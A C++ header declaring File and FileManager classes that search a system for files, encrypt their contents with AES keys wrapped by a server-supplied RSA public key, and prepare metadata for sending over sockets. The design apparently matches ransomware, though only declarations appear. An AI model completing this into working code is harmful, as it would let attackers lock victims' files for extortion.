#pragma once

#include "LogicateCryptography.h"
#include "Serialization.h"

#include <fstream>
#include <vector>
#include <filesystem>

class FileManager;

// can also send over sockets
class File {
friend FileManager;
public:
    File(std::string& path)
    {
        this->m_Metadata.path = Serialization::SerializeString(path);

        if ( !FilePathExists() )
            return;

        this->m_Metadata.size      = std::filesystem::file_size(path);
        this->m_Metadata.name      = Serialization::SerializeString(std::filesystem::path(path).filename().string());
        this->m_Metadata.extension = Serialization::SerializeString(std::filesystem::path(path).extension().string());
    }

    bool              FilePathExists();
    std::string       ReadFrom();
    bool              WriteTo(std::string& data);
    inline void       SetEncryptionKey(BYTESTRING key) { this->m_B64RSAAESKey = std::move(key); };

private: 
    struct FileMetadata {
        BYTESTRING    path;      // full path with name
        unsigned long size;      // bytes
        BYTESTRING    name;      // file name
        BYTESTRING    extension; // file extension, e.g txt
        BYTESTRING    contents;  // data in the file
    } m_Metadata;

    // aes key encrypted with rsa public key from server
    // encoded with base64
    // that was used to encrypt the file
    BYTESTRING        m_B64RSAAESKey;
};

class FileManager {
public:
    FileManager(RSA* rsa)
        : m_RSAPublicKey(rsa)
    {
    }

    void              FindFiles(std::string& startPath); // search system for files
    bool              EncryptContents(File& file); // encrypt the contents of 'file'
    bool              DecryptContents(File& file, RSA* privKey);
    inline void       AddFile(File& file) { this->m_FileList.push_back(file); }
    const BYTESTRING  TransformFile(File& file);   // convert file metadata to BYTESTRING. can be sent over sockets theoretically
    void              OutputFoundFiles(RSA* temp);
private:
    std::vector<File> m_FileList;
    RSA*              m_RSAPublicKey;              // public key to encrypt generated aes keys with
};
